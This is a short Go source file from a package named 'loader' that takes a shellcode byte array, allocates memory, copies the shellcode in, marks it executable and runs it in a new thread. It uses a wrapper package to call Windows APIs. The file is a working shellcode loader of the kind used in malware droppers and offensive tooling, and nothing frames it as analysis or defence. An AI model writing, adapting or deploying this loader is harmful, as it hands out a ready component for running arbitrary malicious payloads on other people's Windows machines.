package loader

import (
	"unsafe"
	"variant/wdll"

	"golang.org/x/sys/windows"
)

func CreateThread(shellcode []byte) {

	addr, _, err := wdll.VirtualAlloc().Call(0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if addr == 0 {
		panic(err)
	}

	wdll.RtlCopyMemory().Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	var oldProtect uint32
	wdll.VirtualProtect().Call(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	thread, _, _ := wdll.CreateThread().Call(0, 0, addr, uintptr(0), 0, 0)
	wdll.WaitForSingleObject().Call(thread, 0xFFFFFFFF)
}
